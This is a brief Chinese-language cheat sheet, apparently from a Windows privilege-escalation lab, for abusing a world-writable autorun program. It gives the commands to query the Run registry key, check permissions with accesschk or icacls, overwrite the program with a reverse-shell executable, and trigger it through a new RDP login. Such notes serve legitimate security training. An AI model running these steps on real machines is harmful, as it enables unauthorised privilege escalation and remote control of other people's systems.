# 自动运行

> **需要能够控制登陆需要具有autorun可执行文件其中一个对所有人可写**

```python
1. 查询
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
2. 检查（看能不能写）
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
或者
icacls "C:\Program Files\Autorun Program\program.exe"
3. 覆盖
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
4. 重启
rdesktop MACHINE_IP
```
